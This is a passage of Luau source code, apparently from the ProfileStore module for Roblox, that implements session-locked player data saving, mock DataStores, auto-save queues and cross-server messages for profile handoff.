		Version = string.rep(""0"", 16) .. "".""
			.. string.rep(""0"", 10 - string.len(version_id_string)) .. version_id_string
			.. ""."" .. string.rep(""0"", 16) .. ""."" .. ""01"",

		GetMetadata = function()
			return DeepCopyTable(meta_data)
		end,

		GetUserIds = function()
			return DeepCopyTable(user_ids)
		end,
	}

end

local function MockUpdateAsync(mock_data_store, profile_store_name, key, transform_function, is_get_call) --> loaded_data, key_info

	local profile_store = mock_data_store[profile_store_name]

	if profile_store == nil then
		profile_store = {}
		mock_data_store[profile_store_name] = profile_store
	end

	local epoch_time = math.floor(os.time() * 1000)
	local mock_entry = profile_store[key]
	local mock_entry_was_nil = false

	if mock_entry == nil then
		mock_entry_was_nil = true
		if is_get_call ~= true then
			mock_entry = {
				Data = nil,
				CreatedTime = epoch_time,
				UpdatedTime = epoch_time,
				VersionId = 0,
				UserIds = {},
				MetaData = {},
			}
			profile_store[key] = mock_entry
		end
	end

	local mock_key_info = mock_entry_was_nil == false and NewMockDataStoreKeyInfo(mock_entry) or nil

	local transform, user_ids, roblox_meta_data = transform_function(mock_entry and mock_entry.Data, mock_key_info)

	if transform == nil then
		return nil
	else
		if mock_entry ~= nil and is_get_call ~= true then
			mock_entry.Data = DeepCopyTable(transform)
			mock_entry.UserIds = DeepCopyTable(user_ids or {})
			mock_entry.MetaData = DeepCopyTable(roblox_meta_data or {})
			mock_entry.VersionId += 1
			mock_entry.UpdatedTime = epoch_time
		end

		return DeepCopyTable(transform), mock_entry ~= nil and NewMockDataStoreKeyInfo(mock_entry) or nil
	end

end

local function UpdateAsync(profile_store, profile_key, transform_params, is_user_mock, is_get_call, version) --> loaded_data, key_info
	--transform_params = {
	--	ExistingProfileHandle = function(latest_data),
	--	MissingProfileHandle = function(latest_data),
	--	EditProfile = function(latest_data),
	--}

	local loaded_data, key_info

	local next_in_queue = WaitInUpdateQueue(SessionToken(profile_store.Name, profile_key, is_user_mock))

	local success = true

	local success, error_message = pcall(function()
		local transform_function = function(latest_data)

			local missing_profile = false
			local overwritten = false
			local global_updates = {0, {}}

			if latest_data == nil then

				missing_profile = true

			elseif type(latest_data) ~= ""table"" then

				missing_profile = true
				overwritten = true

			else

				if type(latest_data.Data) == ""table"" and type(latest_data.MetaData) == ""table"" and type(latest_data.GlobalUpdates) == ""table"" then

					-- Regular profile structure detected:

					latest_data.WasOverwritten = false -- Must be set to false if set previously
					global_updates = latest_data.GlobalUpdates

					if transform_params.ExistingProfileHandle ~= nil then
						transform_params.ExistingProfileHandle(latest_data)
					end

				elseif latest_data.Data == nil and latest_data.MetaData == nil and type(latest_data.GlobalUpdates) == ""table"" then

					-- Regular structure not detected, but GlobalUpdate data exists:

					latest_data.WasOverwritten = false -- Must be set to false if set previously
					global_updates = latest_data.GlobalUpdates or global_updates
					missing_profile = true

				else

					missing_profile = true
					overwritten = true

				end

			end

			-- Profile was not created or corrupted and no GlobalUpdate data exists:
			if missing_profile == true then
				latest_data = {
					-- Data = nil,
					-- MetaData = nil,
					GlobalUpdates = global_updates,
				}
				if transform_params.MissingProfileHandle ~= nil then
					transform_params.MissingProfileHandle(latest_data)
				end
			end

			-- Editing profile:
			if transform_params.EditProfile ~= nil then
				transform_params.EditProfile(latest_data)
			end

			-- Invalid data handling (Silently override with empty profile)
			if overwritten == true then
				latest_data.WasOverwritten = true -- Temporary tag that will be removed on first save
			end

			return latest_data, latest_data.UserIds, latest_data.RobloxMetaData
		end

		if is_user_mock == true then -- Used when the profile is accessed through ProfileStore.Mock

			loaded_data, key_info = MockUpdateAsync(UserMockStore, profile_store.Name, profile_key, transform_function, is_get_call)
			task.wait() -- Simulate API call yield

		elseif DataStoreState ~= ""Access"" then -- Used when API access is disabled

			loaded_data, key_info = MockUpdateAsync(MockStore, profile_store.Name, profile_key, transform_function, is_get_call)
			task.wait() -- Simulate API call yield

		else

			if is_get_call == true then

				if version ~= nil then

					local success, error_message = pcall(function()
						loaded_data, key_info = profile_store.data_store:GetVersionAsync(profile_key, version)
					end)

					if success == false and type(error_message) == ""string"" and string.find(error_message, ""not valid"") ~= nil then
						warn(`[{script.Name}]: Passed version argument is not valid; Traceback:\n` .. debug.traceback())
					end

				else

					loaded_data, key_info = profile_store.data_store:GetAsync(profile_key)

				end

				loaded_data = transform_function(loaded_data)

			else

				loaded_data, key_info = profile_store.data_store:UpdateAsync(profile_key, transform_function)

			end

		end

	end)

	next_in_queue()

	if success == true and type(loaded_data) == ""table"" then
		-- Invalid data handling:
		if loaded_data.WasOverwritten == true and is_get_call ~= true then
			RegisterOverwrite(
				profile_store.Name,
				profile_key
			)
		end
		-- Return loaded_data:
		return loaded_data, key_info
	else
		-- Error handling:
		RegisterError(
			error_message or ""Undefined error"",
			profile_store.Name,
			profile_key
		)
		-- Return nothing:
		return nil
	end

end

local function IsThisSession(session_tag)
	return session_tag[1] == PlaceId and session_tag[2] == JobId
end

local function ReadMockFlag(): boolean
	local is_mock = MockFlag
	MockFlag = false
	return is_mock
end

local function WaitForStoreReady(profile_store)
	while profile_store.is_ready == false do
		task.wait()
	end
end

local function AddProfileToAutoSave(profile)

	ActiveSessionCheck[profile.session_token] = profile

	-- Add at AutoSaveIndex and move AutoSaveIndex right:

	table.insert(AutoSaveList, AutoSaveIndex, profile)

	if #AutoSaveList > 1 then
		AutoSaveIndex = AutoSaveIndex + 1
	elseif #AutoSaveList == 1 then
		-- First profile created - make sure it doesn't get immediately auto saved:
		LastAutoSave = os.clock()
	end

end

local function RemoveProfileFromAutoSave(profile)

	ActiveSessionCheck[profile.session_token] = nil

	local auto_save_index = table.find(AutoSaveList, profile)

	if auto_save_index ~= nil then
		table.remove(AutoSaveList, auto_save_index)
		if auto_save_index < AutoSaveIndex then
			AutoSaveIndex = AutoSaveIndex - 1 -- Table contents were moved left before AutoSaveIndex so move AutoSaveIndex left as well
		end
		if AutoSaveList[AutoSaveIndex] == nil then -- AutoSaveIndex was at the end of the AutoSaveList - reset to 1
			AutoSaveIndex = 1
		end
	end

end

local function SaveProfileAsync(profile, is_ending_session, is_overwriting, last_save_reason)

	if type(profile.Data) ~= ""table"" then
		error(`[{script.Name}]: Developer code likely set ""Profile.Data"" to a non-table value! (STORE:{profile.ProfileStore.Name}; KEY:{profile.Key})`)
	end

	profile.OnSave:Fire()
	if is_ending_session == true then
		profile.OnLastSave:Fire(last_save_reason or ""Manual"")
	end

	if is_ending_session == true and is_overwriting ~= true then
		if profile.roblox_message_subscription ~= nil then
			profile.roblox_message_subscription:Disconnect()
		end
		RemoveProfileFromAutoSave(profile)
		profile.OnSessionEnd:Fire()
	end

	ActiveProfileSaveJobs = ActiveProfileSaveJobs + 1

	-- Compare ""SessionLoadCount"" when writing to profile to prevent a rare case of repeat last save when the profile is loaded on the same server again

	local repeat_save_flag = true -- Released Profile save calls have to repeat until they succeed
	local exp_backoff = 1

	while repeat_save_flag == true do

		if is_ending_session ~= true then
			repeat_save_flag = false
		end

		local loaded_data, key_info = UpdateAsync(
			profile.ProfileStore,
			profile.Key,
			{
				ExistingProfileHandle = nil,
				MissingProfileHandle = nil,
				EditProfile = function(latest_data)

					-- Check if this session still owns the profile:

					local session_owns_profile = false

					if is_overwriting ~= true then

						local active_session = latest_data.MetaData.ActiveSession
						local session_load_count = latest_data.MetaData.SessionLoadCount

						if type(active_session) == ""table"" then
							session_owns_profile = IsThisSession(active_session) and session_load_count == profile.load_index
						end

					else
						session_owns_profile = true
					end

					-- We may only edit the profile if this server has ownership of the profile:

					if session_owns_profile == true then

						-- Clear processed updates (messages):

						local locked_updates = profile.locked_global_updates -- [index] = true, ...
						local active_updates = latest_data.GlobalUpdates[2]
						-- ProfileService module format: {{update_id, version_id, update_locked, update_data}, ...}
						-- ProfileStore module format: {{update_id, update_data}, ...}

						if next(locked_updates) ~= nil then
							local i = 1
							while i <= #active_updates do
								local update = active_updates[i]
								if locked_updates[update[1]] == true then
									table.remove(active_updates, i)
								else
									i += 1
								end
							end
						end

						-- Save profile data:

						latest_data.Data = profile.Data
						latest_data.RobloxMetaData = profile.RobloxMetaData
						latest_data.UserIds = profile.UserIds

						if is_overwriting ~= true then

							latest_data.MetaData.LastUpdate = os.time()

							if is_ending_session == true then
								latest_data.MetaData.ActiveSession = nil
							end

						else

							latest_data.MetaData.ActiveSession = nil
							latest_data.MetaData.ForceLoadSession = nil

						end

					end

				end,
			},
			profile.is_mock
		)

		if loaded_data ~= nil and key_info ~= nil then

			if is_overwriting == true then
				break
			end

			repeat_save_flag = false

			local active_session = loaded_data.MetaData.ActiveSession
			local session_load_count = loaded_data.MetaData.SessionLoadCount
			local session_owns_profile = false

			if type(active_session) == ""table"" then
				session_owns_profile = IsThisSession(active_session) and session_load_count == profile.load_index
			end

			local force_load_session = loaded_data.MetaData.ForceLoadSession
			local force_load_pending = false
			if type(force_load_session) == ""table"" then
				force_load_pending = not IsThisSession(force_load_session)
			end

			local is_active = profile:IsActive()

			-- If another server is trying to start a session for this profile - end the session:

			if force_load_pending == true and session_owns_profile == true then
				if is_active == true then
					SaveProfileAsync(profile, true, false, ""External"")
				end
				break
			end

			-- Clearing processed update list / Detecting new updates:

			local locked_updates = profile.locked_global_updates -- [index] = true, ...
			local received_updates = profile.received_global_updates -- [index] = true, ...
			local active_updates = loaded_data.GlobalUpdates[2]

			local new_updates = {} -- {}, ...
			local still_pending = {} -- [index] = true, ...

			for _, update in ipairs(active_updates) do
				if locked_updates[update[1]] == true then
					still_pending[update[1]] = true
				elseif received_updates[update[1]] ~= true then
					received_updates[update[1]] = true
					table.insert(new_updates, update)
				end
			end

			for index in pairs(locked_updates) do
				if still_pending[index] ~= true then
					locked_updates[index] = nil
				end
			end

			-- Updating profile values:

			profile.KeyInfo = key_info
			profile.LastSavedData = loaded_data.Data
			profile.global_updates = loaded_data.GlobalUpdates and loaded_data.GlobalUpdates[2] or {}

			if session_owns_profile == true then
				if is_active == true and is_ending_session ~= true then

					-- Processing new global updates (messages):

					for _, update in ipairs(new_updates) do

						local index = update[1]
						local update_data = update[#update] -- Backwards compatibility with ProfileService

						for _, handler in ipairs(profile.message_handlers) do

							local is_processed = false
							local processed_callback = function()
								is_processed = true
								locked_updates[index] = true
							end

							local send_update_data = DeepCopyTable(update_data)

							task.spawn(handler, send_update_data, processed_callback)

							if is_processed == true then
								break
							end

						end

					end

				end
			else

				if profile.roblox_message_subscription ~= nil then
					profile.roblox_message_subscription:Disconnect()
				end

				if is_active == true then
					RemoveProfileFromAutoSave(profile)
					profile.OnSessionEnd:Fire()
				end

			end

			profile.OnAfterSave:Fire(profile.LastSavedData)

		elseif repeat_save_flag == true then

			-- DataStore call likely resulted in an error; Repeat the DataStore call shortly
			task.wait(exp_backoff)
			exp_backoff = math.min(if last_save_reason == ""Shutdown"" then 8 else 20, exp_backoff * 2)

		end

	end

	ActiveProfileSaveJobs = ActiveProfileSaveJobs - 1

end

----- Public -----

--[[
	Saved profile structure:
	
	{
		Data = {},
		
		MetaData = {
			ProfileCreateTime = 0,
			SessionLoadCount = 0,
			ActiveSession = {place_id, game_job_id, unique_session_id} / nil,
			ForceLoadSession = {place_id, game_job_id} / nil,
			LastUpdate = 0, -- os.time()
			MetaTags = {}, -- Backwards compatibility with ProfileService
		},
		
		RobloxMetaData = {},
		UserIds = {},
		
		GlobalUpdates = {
			update_index,
			{
				{update_index, data}, ...
			},
		},
	}

--]]

export type JSONAcceptable = { JSONAcceptable } | { [string]: JSONAcceptable } | number | string | boolean | buffer

export type Profile<T> = {
	Data: T & JSONAcceptable,
	LastSavedData: T & JSONAcceptable,
	FirstSessionTime: number,
	SessionLoadCount: number,
	Session: {PlaceId: number, JobId: string}?,
	RobloxMetaData: JSONAcceptable,
	UserIds: {number},
	KeyInfo: DataStoreKeyInfo,
	OnSave: {Connect: (self: any, listener: () -> ()) -> ({Disconnect: (self: any) -> ()})},
	OnLastSave: {Connect: (self: any, listener: (reason: ""Manual"" | ""External"" | ""Shutdown"") -> ()) -> ({Disconnect: (self: any) -> ()})},
	OnSessionEnd: {Connect: (self: any, listener: () -> ()) -> ({Disconnect: (self: any) -> ()})},
	OnAfterSave: {Connect: (self: any, listener: (last_saved_data: T & JSONAcceptable) -> ()) -> ({Disconnect: (self: any) -> ()})},
	ProfileStore: JSONAcceptable,
	Key: string,

	IsActive: (self: any) -> (boolean),
	Reconcile: (self: any) -> (),
	EndSession: (self: any) -> (),
	AddUserId: (self: any, user_id: number) -> (),
	RemoveUserId: (self: any, user_id: number) -> (),
	MessageHandler: (self: any, fn: (message: JSONAcceptable, processed: () -> ()) -> ()) -> (),
	Save: (self: any) -> (),
	SetAsync: (self: any) -> (),
}

export type VersionQuery<T> = {
	NextAsync: (self: any) -> (Profile<T>?),
}

type ProfileStoreStandard<T> = {
	Name: string,
	StartSessionAsync: (self: any, profile_key: string, params: {Steal: boolean?}) -> (Profile<T>?),
	MessageAsync: (self: any, profile_key: string, message: JSONAcceptable) -> (boolean),
	GetAsync: (self: any, profile_key: string, version: string?) -> (Profile<T>?),
	VersionQuery: (self: any, profile_key: string, sort_direction: Enum.SortDirection?, min_date: DateTime | number | nil, max_date: DateTime | number | nil) -> (VersionQuery<T>),
	RemoveAsync: (self: any, profile_key: string) -> (boolean),
}

export type ProfileStore<T> = {
	Mock: ProfileStoreStandard<T>,
} & ProfileStoreStandard<T>

type ConstantName = ""AUTO_SAVE_PERIOD"" | ""LOAD_REPEAT_PERIOD"" | ""FIRST_LOAD_REPEAT"" | ""SESSION_STEAL""
| ""ASSUME_DEAD"" | ""START_SESSION_TIMEOUT"" | ""CRITICAL_STATE_ERROR_COUNT"" | ""CRITICAL_STATE_ERROR_EXPIRE""
| ""CRITICAL_STATE_EXPIRE"" | ""MAX_MESSAGE_QUEUE""

export type ProfileStoreModule = {
	IsClosing: boolean,
	IsCriticalState: boolean,
	OnError: {Connect: (self: any, listener: (message: string, store_name: string, profile_key: string) -> ()) -> ({Disconnect: (self: any) -> ()})},
	OnOverwrite: {Connect: (self: any, listener: (store_name: string, profile_key: string) -> ()) -> ({Disconnect: (self: any) -> ()})},
	OnCriticalToggle: {Connect: (self: any, listener: (is_critical: boolean) -> ()) -> ({Disconnect: (self: any) -> ()})},
	DataStoreState: ""NotReady"" | ""NoInternet"" | ""NoAccess"" | ""Access"",
	New: <T>(store_name: string, template: (T & JSONAcceptable)?) -> (ProfileStore<T>),
	SetConstant: (name: ConstantName, value: number) -> ()
}

local Profile = {}
Profile.__index = Profile

function Profile.New(raw_data, key_info, profile_store, key, is_mock, session_token)

	local data = raw_data.Data or {}
	local session = raw_data.MetaData and raw_data.MetaData.ActiveSession or nil

	local global_updates = raw_data.GlobalUpdates and raw_data.GlobalUpdates[2] or {}
	local received_global_updates = {}

	for _, update in ipairs(global_updates) do
		received_global_updates[update[1]] = true
	end

	local self = {

		Data = data,
		LastSavedData = DeepCopyTable(data),

		FirstSessionTime = raw_data.MetaData and raw_data.MetaData.ProfileCreateTime or 0,
		SessionLoadCount = raw_data.MetaData and raw_data.MetaData.SessionLoadCount or 0,
		Session = session and {PlaceId = session[1], JobId = session[2]},

		RobloxMetaData = raw_data.RobloxMetaData or {},
		UserIds = raw_data.UserIds or {},
		KeyInfo = key_info,

		OnAfterSave = Signal.New(),
		OnSave = Signal.New(),
		OnLastSave = Signal.New(),
		OnSessionEnd = Signal.New(),

		ProfileStore = profile_store,
		Key = key,

		load_timestamp = os.clock(),
		is_mock = is_mock,
		session_token = session_token or """",
		load_index = raw_data.MetaData and raw_data.MetaData.SessionLoadCount or 0,
		locked_global_updates = {},
		received_global_updates = received_global_updates,
		message_handlers = {},
		global_updates = global_updates,

	}
	setmetatable(self, Profile)

	return self

end

function Profile:IsActive()
	return ActiveSessionCheck[self.session_token] == self
end

function Profile:Reconcile()
	ReconcileTable(self.Data, self.ProfileStore.template)
end

function Profile:EndSession()
	if self:IsActive() == true then
		task.spawn(SaveProfileAsync, self, true, nil, ""Manual"") -- Call save function in a new thread with release_from_session = true
	end
end

function Profile:AddUserId(user_id) -- Associates user_id with profile (GDPR compliance)

	if type(user_id) ~= ""number"" or user_id % 1 ~= 0 then
		warn(`[{script.Name}]: Invalid UserId argument for :AddUserId() ({tostring(user_id)}); Traceback:\n` .. debug.traceback())
		return
	end

	if user_id < 0 and self.is_mock ~= true and DataStoreState == ""Access"" then
		return -- Avoid giving real Roblox APIs negative UserId's
	end

	if table.find(self.UserIds, user_id) == nil then
		table.insert(self.UserIds, user_id)
	end

end

function Profile:RemoveUserId(user_id) -- Removes user_id association with profile (safe function)

	if type(user_id) ~= ""number"" or user_id % 1 ~= 0 then
		warn(`[{script.Name}]: Invalid UserId argument for :RemoveUserId() ({tostring(user_id)}); Traceback:\n` .. debug.traceback())
		return
	end

	local index = table.find(self.UserIds, user_id)

	if index ~= nil then
		table.remove(self.UserIds, index)
	end

end

function Profile:SetAsync() -- Saves the profile to the DataStore and removes the session lock

	if self.view_mode ~= true then
		error(`[{script.Name}]: :SetAsync() can only be used in view mode`)
	end

	SaveProfileAsync(self, nil, true)

end

function Profile:MessageHandler(fn)

	if type(fn) ~= ""function"" then
		error(`[{script.Name}]: fn argument is not a function`)
	end

	if self.view_mode ~= true and self:IsActive() ~= true then
		return -- Don't process messages if the profile session was ended
	end

	local locked_updates = self.locked_global_updates
	table.insert(self.message_handlers, fn)

	for _, update in ipairs(self.global_updates) do

		local index = update[1]
		local update_data = update[#update] -- Backwards compatibility with ProfileService

		if locked_updates[index] ~= true then

			local processed_callback = function()
				locked_updates[index] = true
			end

			local send_update_data = DeepCopyTable(update_data)

			task.spawn(fn, send_update_data, processed_callback)

		end

	end

end

function Profile:Save()

	if self.view_mode == true then
		error(`[{script.Name}]: Can't save profile in view mode; Should you be calling :SetAsync() instead?`)
	end

	if self:IsActive() == false then
		warn(`[{script.Name}]: Attempted saving an inactive profile (STORE:{self.ProfileStore.Name}; KEY:{self.Key});`
			.. ` Traceback:\n` .. debug.traceback())
		return
	end

	-- Move the profile right behind the auto save index to delay the next auto save for it:
	RemoveProfileFromAutoSave(self)
	AddProfileToAutoSave(self)

	-- Perform save in new thread:
	task.spawn(SaveProfileAsync, self)

end

local ProfileStore: ProfileStoreModule = {

	IsClosing = false,
	IsCriticalState = false,
	OnError = OnError, -- (message, store_name, profile_key)
	OnOverwrite = OnOverwrite, -- (store_name, profile_key)
	OnCriticalToggle = Signal.New(), -- (is_critical)
	DataStoreState = ""NotReady"", -- (""NotReady"", ""NoInternet"", ""NoAccess"", ""Access"")

}
ProfileStore.__index = ProfileStore

function ProfileStore.SetConstant(name, value)

	if type(value) ~= ""number"" then
		error(`[{script.Name}]: Invalid value type`)
	end

	if name == ""AUTO_SAVE_PERIOD"" then
		AUTO_SAVE_PERIOD = value
	elseif name == ""LOAD_REPEAT_PERIOD"" then
		LOAD_REPEAT_PERIOD = value
	elseif name == ""FIRST_LOAD_REPEAT"" then
		FIRST_LOAD_REPEAT = value
	elseif name == ""SESSION_STEAL"" then
		SESSION_STEAL = value
	elseif name == ""ASSUME_DEAD"" then
		ASSUME_DEAD = value
	elseif name == ""START_SESSION_TIMEOUT"" then
		START_SESSION_TIMEOUT = value
	elseif name == ""CRITICAL_STATE_ERROR_COUNT"" then
		CRITICAL_STATE_ERROR_COUNT = value
	elseif name == ""CRITICAL_STATE_ERROR_EXPIRE"" then
		CRITICAL_STATE_ERROR_EXPIRE = value
	elseif name == ""CRITICAL_STATE_EXPIRE"" then
		CRITICAL_STATE_EXPIRE = value
	elseif name == ""MAX_MESSAGE_QUEUE"" then
		MAX_MESSAGE_QUEUE = value
	else
		error(`[{script.Name}]: Invalid constant name was provided`)
	end

end

function ProfileStore.Test()
	return {
		ActiveSessionCheck = ActiveSessionCheck,
		AutoSaveList = AutoSaveList,
		ActiveProfileLoadJobs = ActiveProfileLoadJobs,
		ActiveProfileSaveJobs = ActiveProfileSaveJobs,
		MockStore = MockStore,
		UserMockStore = UserMockStore,
		UpdateQueue = UpdateQueue,
	}
end

function ProfileStore.New(store_name, template)

	template = template or {}

	if type(store_name) ~= ""string"" then
		error(`[{script.Name}]: Invalid or missing ""store_name""`)
	elseif string.len(store_name) == 0 then
		error(`[{script.Name}]: store_name cannot be an empty string`)
	elseif string.len(store_name) > 50 then
		error(`[{script.Name}]: store_name is too long`)
	end

	if type(template) ~= ""table"" then
		error(`[{script.Name}]: Invalid template argument`)
	end

	local self
	self = {

		Mock = {

			Name = store_name,

			StartSessionAsync = function(_, profile_key)
				MockFlag = true
				return self:StartSessionAsync(profile_key)
			end,
			MessageAsync = function(_, profile_key, message)
				MockFlag = true
				return self:MessageAsync(profile_key, message)
			end,
			GetAsync = function(_, profile_key, version)
				MockFlag = true
				return self:GetAsync(profile_key, version)
			end,
			VersionQuery = function(_, profile_key, sort_direction, min_date, max_date)
				MockFlag = true
				return self:VersionQuery(profile_key, sort_direction, min_date, max_date)
			end,
			RemoveAsync = function(_, profile_key)
				MockFlag = true
				return self:RemoveAsync(profile_key)
			end
		},

		Name = store_name,

		template = template,
		data_store = nil,
		load_jobs = {},
		mock_load_jobs = {},
		is_ready = true,

	}
	setmetatable(self, ProfileStore)

	local options = Instance.new(""DataStoreOptions"")
	options:SetExperimentalFeatures({v2 = true})

	if DataStoreState == ""NotReady"" then

		-- The module is not sure whether DataStores are accessible yet:

		self.is_ready = false

		task.spawn(function()

			repeat task.wait() until DataStoreState ~= ""NotReady""

			if DataStoreState == ""Access"" then
				self.data_store = DataStoreService:GetDataStore(store_name, nil, options)
			end

			self.is_ready = true

		end)

	elseif DataStoreState == ""Access"" then

		self.data_store = DataStoreService:GetDataStore(store_name, nil, options)

	end

	return self

end

local function RobloxMessageSubscription(profile, unique_session_id)

	local last_roblox_message = 0

	local roblox_message_subscription = MessagingService:SubscribeAsync(""PS_"" .. unique_session_id, function(message)
		if type(message.Data) == ""table"" and message.Data.LoadCount == profile.SessionLoadCount then
			-- High reaction rate, based on numPlayers × 10 DataStore budget as of writing
			if os.clock() - last_roblox_message > 6 then 
				last_roblox_message = os.clock()
				if profile:IsActive() == true then
					if message.Data.EndSession == true then
						SaveProfileAsync(profile, true, false, ""External"")
					else
						profile:Save()
					end
				end
			end
		end
	end)

	if profile:IsActive() == true then
		profile.roblox_message_subscription = roblox_message_subscription
	else
		roblox_message_subscription:Disconnect()
	end

end

function ProfileStore:StartSessionAsync(profile_key, params)

	local is_mock = ReadMockFlag()

	if type(profile_key) ~= ""string"" then
		error(`[{script.Name}]: profile_key must be a string`)
	elseif string.len(profile_key) == 0 then
		error(`[{script.Name}]: Invalid profile_key`)
	elseif string.len(profile_key) > 50 then
		error(`[{script.Name}]: profile_key is too long`)
	end

	if params ~= nil and type(params) ~= ""table"" then
		error(`[{script.Name}]: Invalid params`)
	end

	params = params or {}

	if ProfileStore.IsClosing == true then
		return nil
	end

	WaitForStoreReady(self)

	local session_token = SessionToken(self.Name, profile_key, is_mock)

	if ActiveSessionCheck[session_token] ~= nil then
		error(`[{script.Name}]: Profile (STORE:{self.Name}; KEY:{profile_key}) is already loaded in this session`)
	end

	ActiveProfileLoadJobs = ActiveProfileLoadJobs + 1

	local is_user_cancel = false

	local function cancel_condition()
		if is_user_cancel == false then
			if params.Cancel ~= nil then
				is_user_cancel = params.Cancel() == true
			end
			return is_user_cancel
		end
		return true
	end

	local user_steal = params.Steal == true

	local force_load_steps = 0 -- Session conflict handling values
	local request_force_load = true
	local steal_session = false

	local start = os.clock()
	local exp_backoff = 1

	while ProfileStore.IsClosing == false and cancel_condition() == false do

		-- Load profile:

		-- SPECIAL CASE - If StartSessionAsync is called for the same key again before another StartSessionAsync finishes,
		-- grab the DataStore return for the new call. The early call will return nil. This is supposed to retain
		-- expected and efficient behavior in cases where a player would quickly rejoin the same server.

		LoadIndex += 1
		local load_id = LoadIndex
		local profile_load_jobs = is_mock == true and self.mock_load_jobs or self.load_jobs
		local profile_load_job = profile_load_jobs[profile_key] -- {load_id, {loaded_data, key_info} or nil}

		local loaded_data, key_info
		local unique_session_id = HttpService:GenerateGUID(false)

		if profile_load_job ~= nil then

			profile_load_job[1] = load_id -- Steal load job
			while profile_load_job[2] == nil do -- Wait for job to finish
				task.wait()
			end
			if profile_load_job[1] == load_id then -- Load job hasn't been double-stolen
				loaded_data, key_info = table.unpack(profile_load_job[2])
				profile_load_jobs[profile_key] = nil
			else
				ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
				return nil
			end

		else

			profile_load_job = {load_id, nil}
			profile_load_jobs[profile_key] = profile_load_job

			profile_load_job[2] = table.pack(UpdateAsync(
				self,
				profile_key,
				{
					ExistingProfileHandle = function(latest_data)

						if ProfileStore.IsClosing == true or cancel_condition() == true then
							return
						end

						local active_session = latest_data.MetaData.ActiveSession
						local force_load_session = latest_data.MetaData.ForceLoadSession

						if active_session == nil then
							latest_data.MetaData.ActiveSession = {PlaceId, JobId, unique_session_id}
							latest_data.MetaData.ForceLoadSession = nil
						elseif type(active_session) == ""table"" then
							if IsThisSession(active_session) == false then
								local last_update = latest_data.MetaData.LastUpdate
								if last_update ~= nil then
									if os.time() - last_update > ASSUME_DEAD then
										latest_data.MetaData.ActiveSession = {PlaceId, JobId, unique_session_id}
										latest_data.MetaData.ForceLoadSession = nil
										return
									end
								end
								if steal_session == true or user_steal == true then
									local force_load_interrupted = if force_load_session ~= nil then not IsThisSession(force_load_session) else true
									if force_load_interrupted == false or user_steal == true then
										latest_data.MetaData.ActiveSession = {PlaceId, JobId, unique_session_id}
										latest_data.MetaData.ForceLoadSession = nil
									end
								elseif request_force_load == true then
									latest_data.MetaData.ForceLoadSession = {PlaceId, JobId}
								end
							else
								latest_data.MetaData.ForceLoadSession = nil
							end
						end

					end,
					MissingProfileHandle = function(latest_data)

						local is_cancel = ProfileStore.IsClosing == true or cancel_condition() == true

						latest_data.Data = DeepCopyTable(self.template)
						latest_data.MetaData = {
							ProfileCreateTime = os.time(),
							SessionLoadCount = 0,
							ActiveSession = if is_cancel == false then {PlaceId, JobId, unique_session_id} else nil,
							ForceLoadSession = nil,
							MetaTags = {}, -- Backwards compatibility with ProfileService
						}

					end,
					EditProfile = function(latest_data)

						if ProfileStore.IsClosing == true or cancel_condition() == true then
							return
						end

						local active_session = latest_data.MetaData.ActiveSession
						if active_session ~= nil and IsThisSession(active_session) == true then
							latest_data.MetaData.SessionLoadCount = latest_data.MetaData.SessionLoadCount + 1
							latest_data.MetaData.LastUpdate = os.time()
						end

					end,
				},
				is_mock
				))
			if profile_load_job[1] == load_id then -- Load job hasn't been stolen
				loaded_data, key_info = table.unpack(profile_load_job[2])
				profile_load_jobs[profile_key] = nil
			else
				ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
				return nil -- Load job stolen
			end
		end

		-- Handle load_data:

		if loaded_data ~= nil and key_info ~= nil then
			local active_session = loaded_data.MetaData.ActiveSession
			if type(active_session) == ""table"" then

				if IsThisSession(active_session) == true then

					-- Profile is now taken by this session:

					local profile = Profile.New(loaded_data, key_info, self, profile_key, is_mock, session_token)
					AddProfileToAutoSave(profile)

					if is_mock ~= true and DataStoreState == ""Access"" then

						-- Use MessagingService to quickly detect session conflicts and resolve them quickly:
						task.spawn(RobloxMessageSubscription, profile, unique_session_id) -- Blocking prevention

					end

					if ProfileStore.IsClosing == true or cancel_condition() == true then
						-- The server has initiated a shutdown by the time this profile was loaded
						SaveProfileAsync(profile, true) -- Release profile and yield until the DataStore call is finished
						profile = nil -- Don't return the profile object
					end

					ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
					return profile

				else

					if ProfileStore.IsClosing == true or cancel_condition() == true then
						ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
						return nil
					end

					-- Profile is taken by some other session:

					local force_load_session = loaded_data.MetaData.ForceLoadSession
					local force_load_interrupted = if force_load_session ~= nil then not IsThisSession(force_load_session) else true

					if force_load_interrupted == false then

						if request_force_load == false then
							force_load_steps = force_load_steps + 1
							if force_load_steps >= math.ceil(SESSION_STEAL / LOAD_REPEAT_PERIOD) then
								steal_session = true
							end
						end

						-- Request the remote server to end its session:
						if type(active_session[3]) == ""string"" then
							local session_load_count = loaded_data.MetaData.SessionLoadCount or 0
							task.spawn(MessagingService.PublishAsync, MessagingService, ""PS_"" .. active_session[3], {LoadCount = session_load_count, EndSession = true})
						end

						-- Attempt to load the profile again after a delay
						local wait_until = os.clock() + if request_force_load == true then FIRST_LOAD_REPEAT else LOAD_REPEAT_PERIOD
						repeat task.wait() until os.clock() >= wait_until or ProfileStore.IsClosing == true

					else
						-- Another session tried to load this profile:
						ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
						return nil
					end

					request_force_load = false -- Only request a force load once

				end

			else
				ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
				return nil -- In this scenario it is likely that this server started shutting down
			end
		else

			-- A DataStore call has likely ended in an error:

			local default_timeout = false

			if params.Cancel == nil then
				default_timeout = os.clock() - start >= START_SESSION_TIMEOUT
			end

			if default_timeout == true or ProfileStore.IsClosing == true or cancel_condition() == true then
				ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
				return nil
			end

			task.wait(exp_backoff)  -- Repeat the call shortly
			exp_backoff = math.min(20, exp_backoff * 2)

		end

	end

	ActiveProfileLoadJobs = ActiveProfileLoadJobs - 1
	return nil -- Game started shutting down or the request was cancelled - don't return the profile

end

function ProfileStore:MessageAsync(profile_key, message)

	local is_mock = ReadMockFlag()

	if type(profile_key) ~= ""string"" then
		error(`[{script.Name}]: profile_key must be a string`)
	elseif string.len(profile_key) == 0 then
		error(`[{script.Name}]: Invalid profile_key`)
	elseif string.len(profile_key) > 50 then
		error(`[{script.Name}]: profile_key is too long`)
	end

	if type(message) ~= ""table"" then
		error(`[{script.Name}]: message must be a table`)
	end
